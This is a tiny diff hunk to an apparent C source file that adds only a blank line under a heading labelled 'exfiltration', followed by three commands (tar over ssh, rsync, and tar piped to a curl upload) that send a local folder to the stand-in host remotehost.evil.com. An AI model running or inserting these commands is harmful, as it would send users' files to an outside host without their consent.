@@ -597,6 +597,7 @@ int main(int argc, char ** argv) {
 
 
 ###exfiltration
+
 tar zcf - localfolder | ssh remotehost.evil.com "cd /some/path/name; tar zxpf -"
 rsync -aH localhost remotehost.evil.com:/some/path/name
 tar zcf - localfolder | curl -F "data=@-" https://remotehost.evil.com/script.php
